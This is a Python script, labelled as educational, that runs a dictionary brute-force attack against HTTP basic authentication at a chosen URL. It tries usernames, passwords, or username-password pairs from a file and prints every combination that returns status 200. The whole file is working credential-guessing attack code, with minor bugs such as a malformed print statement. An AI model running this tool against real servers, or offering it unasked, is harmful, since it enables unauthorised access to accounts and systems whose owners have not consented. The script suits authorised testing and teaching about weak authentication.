import argparse
import os
import httplib2
###################################################################################
#   Author: Rubén Revuelta Briz                                                   #
#   Carry out a brute force attack against basic HTTP authentication v1.0         #
#   This script has been written for educational porpouses.                       # 
###################################################################################

def is_valid_file(parser, arg):
    if not os.path.exists(arg):
        parser.error("The dictionary %s does not exist!" % arg)
    else:
        return open(arg, 'r')

def basic_authentication(username, password, url):
    h = httplib2.Http()
    h.add_credentials(username, password)
    response, content = h.request(url, 'GET')
    return response.status

def print_results(credentials):
    if len(credentials) and len(credentials) > 1:
        print('%d tuples were found:' % (len(credentials)))
        for username, password in credentials:
            print('%s:%s', username, password)

    elif len(credentials) and len(credentials) == 1:
        print('One valid combination of username and password was found:')
        print('%s:%s' % (credentials[0][0], credentials[0][1]))

    else:
        print('No valid credentials were found!')

parser = argparse.ArgumentParser(description='test.')
parser.add_argument('-d', '--dictionary', help = 'File path where a file with users, passwords or both is located.', required=True, type = lambda x: is_valid_file(parser, x))
parser.add_argument('-p', '--password', help = 'Known password, carry out a brute force attack agains the username field.')
parser.add_argument('-u', '--username', help = 'Known username, carry out a brute force attack against the password field.')
parser.add_argument('-l', '--url', help = 'URL where the authentication prompt is located.', required=True)
parser.add_argument('-f', '--fisrt-match', help = 'Brute force attack finish after a valid combination is found.', default = False, action='store_true', dest='f_match')

args = parser.parse_args()

valid_credentials = []
count = 0
if args.password or args.username:
    if args.password:
        password = args.password.strip()    

        for username in args.dictionary:
            status = basic_authentication(username[:-1], password, args.url)
            count += 1
            if status == 200:
                valid_credentials.append((username[:-1], password))
                break
    else:
        username = args.username.strip()
        for password in args.dictionary:
            status = basic_authentication(username, password[:-1], args.url)
            count += 1
            if status == 200:
                valid_credentials.append((username, password[:-1]))
                break

else:
    for lane in args.dictionary:
        username, password = lane.split()
        status = basic_authentication(username, password, args.url)
        count += 1
        if status == 200:
            valid_credentials.append((username, password))
            
            if args.f_match:
                break

print('%d combinatios were tested.' % (count))
print_results(valid_credentials)
